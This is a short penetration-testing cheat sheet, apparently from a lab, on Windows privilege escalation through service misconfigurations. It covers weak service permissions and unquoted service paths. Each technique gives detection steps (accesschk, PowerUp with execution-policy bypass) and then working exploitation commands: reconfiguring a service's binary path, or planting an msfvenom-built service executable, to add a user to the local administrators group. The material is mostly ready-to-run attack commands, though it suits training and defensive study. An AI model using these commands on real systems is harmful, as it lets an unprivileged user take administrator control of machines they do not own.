Service Permissions(Paths)

# Service Permissions(Paths)
**Binary Path:**
Detection
On Target
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *
2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
or
>powershell -ep bypass
>. .\PowerUp.ps1
>Invoke-AllChecks

Notice under service permissions...

Exploitation
On Target
1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators <user> /add"
2. In command prompt type: sc start daclsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators


**Unquoted Service Path:**
Detection
Target
1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
or
```
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

Notice under unquoted service paths... Look for spaces in Path that has no quotes

Exploitation
Attacker
1. Open command prompt and type: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
2. Copy the generated file, common.exe, to the Target
Target
1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc
3.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators
